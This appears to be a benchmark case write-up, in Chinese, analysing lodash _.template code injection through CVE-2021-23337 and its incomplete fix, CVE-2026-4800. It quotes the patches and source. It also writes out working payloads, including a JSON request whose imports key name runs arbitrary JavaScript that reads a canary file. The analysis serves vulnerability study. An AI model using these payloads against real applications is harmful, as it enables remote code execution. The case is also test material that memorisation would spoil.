# lodash template：variable 校验了，imports 的键名照样进 Function()

- Case：`PCBV2-0140`
- 产品：npm `lodash`。应用侧是一个 Fastify「模板编译」接口，把用户给的 `variable` 和 `imports` 键名交给 `_.template`。
- 链：CVE-2021-23337（4.17.20 → 4.17.21，commit `3469357cff`）→ CVE-2026-4800（4.17.21…4.17.23 → 4.18.0，commit `879aaa9`）
- 源码对着发布包 `lodash@4.17.21` 的 `lodash.js`：`template`、`reForbiddenIdentifierChars`、`Function(importsKeys, ...)`。运行时装的是发布包本身，不是抽出来的函数。

2021 年 2 月，lodash 给 `_.template` 的 `options.variable` 加了一张禁止字符表，想挡住 `variable: 'x=process.exit()'` 这种默认参数注入。NVD / Snyk 把 CVE-2021-23337 写成 *Command Injection via the template function*。五年后 GHSA-r5fr-rjxr-66jc 指出：同一张表没有套到 `options.imports` 的键名上，而键名和 `variable` 一样会流进 `Function()` 的形参列表。NVD CVE-2026-4800 写明 *the fix for CVE-2021-23337 added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink*。

根因不只是「少校验一个选项」。检查插在「`variable` 字符串长什么样」这一层；真正编译代码的是后面的 `Function(importsKeys, 'return ' + source)`；同函数里已经有 `reForbiddenIdentifierChars`，却只挂在 `variable` 上。下面按请求走进去、4.17.21 改了哪几行、校验之后谁真正 `Function()`、更宽的同一张表有没有挂上，把这几层写完。

---

## 这块功能本来在干什么

`_.template(string, options)` 把 lodash 模板编译成函数。`options.variable` 变成生成函数的形参名；`options.imports` 的键变成外层 `Function` 的形参，值变成闭包里的绑定。一次典型的「命名导入」用法：

```http
POST /compile
Content-Type: application/json

{"source":"X","variable":"data","importsKeys":["_"]}
```

本 case 的 Fastify 服务把用户给的 `variable` 和 `importsKeys` 原样交给真实 `_.template`。用户导入名没有对应值，一律绑成 `undefined`——这正好触发默认参数：形参写成 `x=<expr>` 时，值为 `undefined` 就会在**构造 Function 时**求值。

成功穿越之后的效果是：注入的表达式读 `/canary.txt`（entrypoint 写入的 `PCB_FLAG`），写到 `/tmp/pwn.txt`。judge 读这个文件。

数据流：

```text
HTTP JSON {source, variable, importsKeys}
    → _.template(source, options)
         assignInWith 合并 options / settings / imports
         importsKeys = keys(imports)          ← 用户键名，V1 不查
         拼 source = 'function(' + variable + ') { ... }'
         V1：reForbiddenIdentifierChars.test(variable)   ← 补丁插在这里
         Function(importsKeys, 'return ' + source)       ← 真正的编译
              .apply(undefined, importsValues)
    → 注入表达式读 /canary.txt → /tmp/pwn.txt
```

没有登录。判断完全信任「只有 `variable` 会进形参列表」，不信任 `Function` 的第一个参数数组也是形参。

---

## 原始漏洞：variable 直接拼进 function(...)（CVE-2021-23337，4.17.20）

4.17.20 的 `template` 在拼完函数体之后，把 `variable` 嵌进：

```javascript
source = 'function(' + (variable || 'obj') + ') {\n' + ...
return Function(importsKeys, sourceURL + 'return ' + source)
```

没有禁止字符检查。`variable = 'x=process.exit()'` 变成：

```javascript
function(x=process.exit()) { ... }
```

`Function()` 解析这串源码时，默认参数表达式立刻执行。本 case 的 seed：

```text
source   = "X"
variable = x=process.getBuiltinModule("fs").writeFileSync("/tmp/pwn.txt", process.getBuiltinModule("fs").readFileSync("/canary.txt"))
```

4.17.20 上 `/tmp/pwn.txt` 出现 `PCBFLAG_...`。这就是 v0 + `--seed` 退出码 0。

当时 `importsKeys` 已经作为 `Function` 的第一组形参存在，只是 CVE-2021-23337 的公开讨论围着 `variable` 转。

---

## 维护者改了什么（CVE-2021-23337 修复，4.17.21）

commit `3469357cff396a26c363f8c1b5a91dde28ba4b1c`（*Prevent command injection through `_.template`'s `variable` option*）加了一张表，并只在 `variable` 有值时测试。发布包 `lodash@4.17.21` 的相关行：

```javascript
// lodash.js  (lodash@4.17.21)
var reForbiddenIdentifierChars = /[()=,{}\[\]\/\s]/;
...
INVALID_TEMPL_VAR_ERROR_TEXT = 'Invalid `variable` option passed into `_.template`';
```

```javascript
// lodash.js :: template  (lodash@4.17.21，约 L14838–14943)
function template(string, options, guard) {
  ...
  string = toString(string);
  options = assignInWith({}, options, settings, customDefaultsAssignIn);

  var imports = assignInWith({}, options.imports, settings.imports, customDefaultsAssignIn),
      importsKeys = keys(imports),
      importsValues = baseValues(imports, importsKeys);
  ...
  var variable = hasOwnProperty.call(options, 'variable') && options.variable;
  if (!variable) {
    source = 'with (obj) {\n' + source + '\n}\n';
  }
  // Throw an error if a forbidden character was found in `variable`, to prevent
  // potential command injection attacks.
  else if (reForbiddenIdentifierChars.test(variable)) {
    throw new Error(INVALID_TEMPL_VAR_ERROR_TEXT);
  }
  ...
  source = 'function(' + (variable || 'obj') + ') {\n' + ...

  var result = attempt(function() {
    return Function(importsKeys, sourceURL + 'return ' + source)
      .apply(undefined, importsValues);
  });
  ...
}
```

V1 正则禁止的是能改写形参语法的字符：`()`、`=`、逗号、`{}[]`、斜杠、空白。`variable` 里出现 `=` 就抛 `Invalid variable option passed into _.template`，到不了 `Function()`。

对 seed 这种明文 `x=...` 的 `variable`，它确实够用。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 能进 `Function` 形参列表的、用户可控的标识符只有 `variable`。
2. `importsKeys` 是开发者写死的安全名字（`_`、`undefined` 之类）。

第二点在「应用把用户输入当 imports 键名」时不成立。更关键的是：`reForbiddenIdentifierChars` 测完 `variable` 之后，代码仍然把**未校验**的 `importsKeys` 交给同一个 `Function`。

---

## 校验之后，谁真正 Function()

V1 的 `else if` 一结束，同一个函数用已经算好的 `importsKeys` 调 `Function`：

```javascript
return Function(importsKeys, sourceURL + 'return ' + source)
  .apply(undefined, importsValues);
```

`Function(argName1, argName2, ..., body)` 的前面若干参数是外层函数的形参名。`importsKeys` 里若有 `x=<expr>`，生成的是：

```javascript
Function("x=process.getBuiltinModule(\"fs\").writeFileSync(...)", "return function(obj){...}")
```

等价于：

```javascript
function(x=process.getBuiltinModule("fs").writeFileSync(...)) {
  return function(obj){ ... }
}
```

`.apply(undefined, importsValues)` 传入的对应值是 `undefined`（本 case 故意不给导入值），默认参数表达式在构造时执行，读 `/canary.txt`，写 `/tmp/pwn.txt`。

`variable` 守卫刚看过的是 `options.variable` 这一根字符串；`Function` 看到的是另一根字符串数组 `importsKeys`。两套形参中间没有第二次谓词。

`assignInWith` 还会用 `for..in` 把继承属性抄进 `imports`。若 `Object.prototype` 已被别的洞污染，脏键名同样进入 `importsKeys`。CVE-2026-4800 advisory 把这写成第二条面；本 case 的 residual 不依赖原型污染，直接送键名。

---

## 仓库里已经有更强的表，imports 没用

`reForbiddenIdentifierChars` 在文件顶部，V1 只在 `variable` 分支调用。V2 对 `importsKeys` 用的是**同一张表**：

```javascript
// lodash.js :: template  (lodash@4.18.0，commit 879aaa9)
arrayEach(importsKeys, function(key) {
  if (reForbiddenIdentifierChars.test(key)) {
    throw new Error(INVALID_TEMPL_IMPORTS_ERROR_TEXT);
  }
});
```

谁在 V1 调用这张表：

| 值 | 调用 `reForbiddenIdentifierChars`？ |
|---|---|
| `options.variable` | 是，非法则 throw |
| `importsKeys` 每个键 | **否**，原样进 `Function` |

不是仓库里没有「形参名不能带 `=`」这份谓词。V1 等于在 `variable` 上又做了一次校验，而同一 sink 的另一组形参始终没挂上。commit `879aaa9` 的说明原文：*The `variable` option was validated against `reForbiddenIdentifierChars` but `importsKeys` was left unguarded, allowing code injection via the same `Function()` constructor sink.*

即便应用不开放 `variable`，只要开放 imports 键名，V1 的那张表根本不会被问到。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs Function」落到具体代码：

- `reForbiddenIdentifierChars.test(variable)`：看 `variable` 里有没有 `=` / `()` / 空白
- `Function(importsKeys, body)`：看键名数组拼进形参列表之后引擎怎么解析

只要把 `x=<expr>` 从 `variable` 挪到 `imports` 的键上，第一行不运行（`variable` 未设，走 `with (obj)` 分支），第二行仍然编译并执行默认参数。

token 变换：

```text
seed:      options.variable = "x=<RCE>"
V1:        test(variable) 命中 `=` → throw Invalid variable
           到不了 Function()

residual:  options.imports = { "x=<RCE>": undefined }
           options.variable 缺省
V1:        不进 else if
           importsKeys = ["x=<RCE>"]
           Function("x=<RCE>", "return function(obj){...}")
           默认参数求值 → 读 canary
```

`source` 两边都是无害的 `"X"`。变的不是模板正文，是哪一根用户字符串被当成标识符。

V1 拦的是「`variable` 这一个选项」；CVE-2021-23337 真正要拦的是「用户字符串不能改写 `Function()` 的形参语法」。后者在 `importsKeys` 上原样还在。

---

## 残余仍然走同一条 Function() 编译路径（CVE-2026-4800）

没有换 API、没有换 sink、没有换 canary 文件。还是 `_.template` → `Function(importsKeys, ...)`：

```json
{"source":"X","importsKeys":["x=process.getBuiltinModule(\"fs\").writeFileSync(\"/tmp/pwn.txt\", process.getBuiltinModule(\"fs\").readFileSync(\"/canary.txt\"))"]}
```

`template` 仍然先合并 imports、再拼 `source`、再（因为没有 `variable`）包一层 `with`；`reForbiddenIdentifierChars` 不跑；`Function` 把那根带 `=` 的键当形参；表达式读 `/canary.txt` 写 `/tmp/pwn.txt`。

本 case `verify.sh` 的 residual 把 candidate 写死在脚本里。和 GHSA-r5fr-rjxr-66jc / NVD 描述的 imports 键名注入同一构造。认证：v1 + `--residual` 退出码 0，`/tmp/pwn.txt` 里观察到 `PCBFLAG_...`。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：校验只覆盖 `variable`；`Function` 的另一组形参是 `importsKeys`；禁止字符表已经存在却没挂上。seed 被挡住只说明「`variable` 不能再带 `=`」，不说明「不能再在编译期执行表达式」。

平台 verify 的 residual 打的就是这条 incomplete-fix 链上的同一 `Function()` sink，不是另一条无关 sink。

---

## 后来又补了什么（CVE-2026-4800，4.18.0）

commit `879aaa9`（*fix: validate imports keys in _.template*）做了两处：

1. 对每个 `importsKeys` 跑同一张 `reForbiddenIdentifierChars`，失败抛 `Invalid imports option passed into _.template`
2. 把合并 `options` / `imports` 的 `assignInWith` 换成 `assignWith`，只抄自有属性，避免污染键经 `for..in` 进来

对残余输入：键名含 `=`，throw，到不了 `Function()`。公开建议是升级到 4.18.0（随后 4.18.1）。`lodash.template` 独立包长期没跟主包重发，那是另一条面，本 case 用的是主包 `lodash`。

即便如此，这仍然是「在 `Function()` 之前用同一张表再扫一遍键名」。模板正文里的 `evaluate` 分隔符仍是故意的代码注入面（设计如此）。本 benchmark 的 v2 只关闭 imports 键名这条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 `variable` 这一根字符串。真正执行用户代码的是 `Function(importsKeys, body)`。V2 仍在同一层加码，但终于把表套到另一组形参上。

**不是没有更好的谓词。**  
`reForbiddenIdentifierChars` 比「相信 imports 键名是安全的」更接近「不能改写形参语法」。它已经用在 `variable` 上。从 V1 的 diff 只能看到 `else if (reForbiddenIdentifierChars.test(variable))`；要判断补丁是否闭合，必须看到十行之外的 `Function(importsKeys, ...)`。

**同一函数、同一 `Function()`，只换了哪根用户字符串当形参。**  
任何把用户输入放进 `options.imports` 键名的应用，在 4.17.21 上都吃这次编译。advisory 写明 *Do not pass untrusted input as key names in options.imports*。

**`assignInWith` 是第二条缝。**  
V1 用 `for..in` 合并 imports。原型上多出来的键也会进 `Function`。V2 换成 `assignWith` 是因为同一 sink，不是新洞。

**金丝雀在树外是有意的。**  
`/canary.txt` 不是模板能读到的普通数据。能写到 `/tmp/pwn.txt`，说明执行的是任意 JS，而不是「模板碰巧输出了同一串字符」。

---

## 版本、入口、参考

| | npm | `variable` | `importsKeys` | `Function()` | seed `variable=x=...` | residual `imports` 键 `x=...` |
|---|---|---|---|---|---|---|
| V0 | 4.17.20 | 不查 | 不查 | 两组形参都进 | 读到 canary | （不必） |
| V1 | 4.17.21 | `reForbiddenIdentifierChars` | 不查 | 同上 | throw Invalid variable | 读到 canary |
| V2 | 4.18.0 | 同上 | 同一张表 | `assignWith` | 挡 | throw Invalid imports |

- Web：`POST /compile` `{source, variable, importsKeys}`
- 认证（本平台）：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到
- [CVE-2021-23337](https://nvd.nist.gov/vuln/detail/CVE-2021-23337) / [GHSA-35jh-r3h4-6jhm](https://github.com/advisories/GHSA-35jh-r3h4-6jhm)
- [CVE-2026-4800](https://nvd.nist.gov/vuln/detail/CVE-2026-4800) / [GHSA-r5fr-rjxr-66jc](https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc)
- V1 commit：[3469357cff](https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c)
- V2 commit：[879aaa9](https://github.com/lodash/lodash/commit/879aaa9)
- 源码：发布包 `lodash@4.17.21` 的 `lodash.js` `template`
